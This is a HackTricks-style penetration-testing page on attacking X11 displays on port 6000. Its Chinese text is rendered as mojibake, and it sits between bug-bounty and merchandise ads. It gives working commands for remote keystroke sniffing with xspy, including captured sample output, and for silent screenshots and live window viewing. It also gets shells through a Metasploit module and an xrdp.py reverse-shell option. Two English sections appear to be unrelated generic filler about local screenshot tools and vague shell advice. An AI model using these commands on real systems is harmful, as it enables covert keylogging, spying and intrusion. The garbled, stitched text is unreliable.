# 6000 - X11æ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**æ— éœ€ç­‰å¾…å³å¯è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¶ä»£æŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## åŸºæœ¬ä¿¡æ¯

X Window Systemï¼ˆä¹Ÿç§°ä¸ºXï¼‰æ˜¯ä¸€ç§ç”¨äºä½å›¾æ˜¾ç¤ºçš„çª—å£ç³»ç»Ÿï¼Œå¸¸è§äºåŸºäºUNIXçš„æ“ä½œç³»ç»Ÿã€‚Xä¸ºåŸºäºGUIçš„ç¯å¢ƒæä¾›äº†åŸºæœ¬æ¡†æ¶ã€‚Xä¹Ÿä¸å¼ºåˆ¶è¦æ±‚ç”¨æˆ·ç•Œé¢ - è¿™ç”±å„ä¸ªç¨‹åºå¤„ç†ã€‚\
æ¥æºï¼š[https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

**é»˜è®¤ç«¯å£ï¼š**6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## æšä¸¾

æ£€æŸ¥**åŒ¿åè¿æ¥ï¼š**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### æœ¬åœ°æšä¸¾

ç”¨æˆ·ä¸»ç›®å½•ä¸­çš„æ–‡ä»¶**`.Xauthority`**è¢«**X11ç”¨äºæˆæƒ**ã€‚æ¥è‡ª[**è¿™é‡Œ**](https://stackoverflow.com/a/37367518)ï¼š

> MIT-magic-cookie-1ï¼šç”Ÿæˆ128ä½çš„å¯†é’¥ï¼ˆâ€œcookieâ€ï¼‰ï¼Œå°†å…¶å­˜å‚¨åœ¨\~/.Xauthorityï¼ˆæˆ–XAUTHORITYç¯å¢ƒå˜é‡æŒ‡å‘çš„ä½ç½®ï¼‰ã€‚å®¢æˆ·ç«¯ä»¥æ˜æ–‡å½¢å¼å°†å…¶å‘é€åˆ°æœåŠ¡å™¨ï¼æœåŠ¡å™¨æ£€æŸ¥æ˜¯å¦æœ‰æ­¤â€œcookieâ€çš„å‰¯æœ¬ï¼Œå¦‚æœæœ‰ï¼Œåˆ™å…è®¸è¿æ¥ã€‚å¯†é’¥ç”±DMXç”Ÿæˆã€‚

{% hint style="warning" %}
ä¸ºäº†**ä½¿ç”¨cookie**ï¼Œæ‚¨åº”è¯¥è®¾ç½®ç¯å¢ƒå˜é‡ï¼š**`export XAUTHORITY=/path/to/.Xauthority`**
{% endhint %}

## éªŒè¯è¿æ¥
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## é”®ç›˜è®°å½•

ä½¿ç”¨[xspy](http://tools.kali.org/sniffingspoofing/xspy)æ¥å—…æ¢é”®ç›˜æŒ‰é”®ã€‚

ç¤ºä¾‹è¾“å‡ºï¼š
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## æˆªå›¾æ•è·

To capture screenshots during a penetration test, you can use various tools and techniques. Here are some common methods:

### 1. Scrot

Scrot is a command-line tool that allows you to capture screenshots in Linux. You can install it using the following command:

```
sudo apt-get install scrot
```

To capture a screenshot, simply run the following command:

```
scrot screenshot.png
```

This will save the screenshot as `screenshot.png` in the current directory.

### 2. Shutter

Shutter is a feature-rich screenshot tool for Linux. You can install it using the following command:

```
sudo apt-get install shutter
```

Once installed, you can launch Shutter from the applications menu. It provides a graphical interface to capture screenshots and offers various editing options.

### 3. Flameshot

Flameshot is another popular screenshot tool for Linux. You can install it using the following command:

```
sudo apt-get install flameshot
```

To capture a screenshot, run the following command:

```
flameshot gui
```

This will open the Flameshot interface, allowing you to capture and edit screenshots.

### 4. Snipping Tool (Windows)

If you are using Windows, you can use the built-in Snipping Tool to capture screenshots. Simply search for "Snipping Tool" in the Start menu and launch the application. It provides a user-friendly interface to capture screenshots.

### 5. Snip & Sketch (Windows 10)

For Windows 10 users, Snip & Sketch is a built-in screenshot tool. You can search for "Snip & Sketch" in the Start menu and launch the application. It offers various screenshot capture options and editing features.

Remember to use these tools responsibly and only capture screenshots within the scope of your penetration test.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## è¿œç¨‹æ¡Œé¢æŸ¥çœ‹

æ¥æºï¼š[https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
ä»ï¼š[https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨xwininfoæ‰¾åˆ°çª—å£çš„IDã€‚
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

å¯¹äº**å®æ—¶æŸ¥çœ‹**ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## è·å–Shell

To get a shell on a target system, you can exploit vulnerabilities in the X11 server or use X11 forwarding.

### Exploiting X11 Server Vulnerabilities

1. **X11 Server Misconfiguration**: Check if the X11 server is misconfigured and allows connections from unauthorized hosts. If so, you can connect to the X11 server and execute commands.

2. **X11 Server Buffer Overflow**: Exploit buffer overflow vulnerabilities in the X11 server to execute arbitrary code and gain a shell.

3. **X11 Server Authentication Bypass**: Exploit authentication bypass vulnerabilities in the X11 server to gain unauthorized access and execute commands.

### Using X11 Forwarding

1. **SSH X11 Forwarding**: If the target system has SSH enabled with X11 forwarding, you can use the `-X` or `-Y` option to enable X11 forwarding and run graphical applications remotely.

2. **X11 Forwarding over Netcat**: Use Netcat to forward X11 traffic between the target system and your machine. This allows you to run X11 applications on the target system and interact with them remotely.

3. **X11 Forwarding over SSH Tunnel**: Set up an SSH tunnel to forward X11 traffic between the target system and your machine. This allows you to securely run X11 applications on the target system and interact with them remotely.

Remember to always obtain proper authorization before attempting to gain shell access on a target system. Unauthorized access is illegal and unethical.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
å¦ä¸€ç§æ–¹æ³•ï¼š

**åå‘Shellï¼š** Xrdpè¿˜å…è®¸é€šè¿‡Netcatè·å–åå‘Shellã€‚è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š

**./xrdp.py \<IP:0> â€“no-disp**

![](../.gitbook/assets/112217\_0051\_ExploitingX15.jpeg)

å®ƒå°†æç¤ºä¸€ä¸ªæ–°çš„æ§åˆ¶é¢æ¿ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°R-shellé€‰é¡¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX16.jpeg)

æˆ‘ä»¬å°†åœ¨æœ¬åœ°ç³»ç»Ÿä¸Šçš„ç«¯å£5555ä¸Šå¯åŠ¨Netcatç›‘å¬æ¨¡å¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX17.jpeg)

ç„¶åæ·»åŠ IPå’Œç«¯å£ï¼Œç„¶åé€‰æ‹©R-Shellï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX18.jpeg)

ç°åœ¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œæˆ‘ä»¬å·²ç»å®Œå…¨è®¿é—®äº†ç³»ç»Ÿï¼š

![](../.gitbook/assets/112217\_0051\_ExploitingX19.jpeg)

{% embed url="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" %}

## Shodan

* `port:6000 x11`

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´ç»è¿‡éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å´›èµ·ä¹‹æ—¶æŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register) å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
